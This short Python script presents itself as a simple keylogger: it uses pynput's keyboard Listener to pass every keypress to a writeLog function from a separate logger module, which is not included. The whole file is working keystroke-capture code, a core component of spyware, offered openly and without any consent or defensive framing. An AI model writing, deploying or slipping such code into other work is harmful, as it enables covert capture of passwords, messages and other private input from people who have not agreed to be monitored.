#!/usr/bin/env python3

"""
Key Logger is a simple program that records keystrokes and writes them to a file.
"""

from logger import writeLog
from pynput.keyboard import Listener

def main():
    """
    Main function.
    """
    with Listener(on_press=writeLog) as l:
        l.join()

if __name__ == "__main__":
    main()
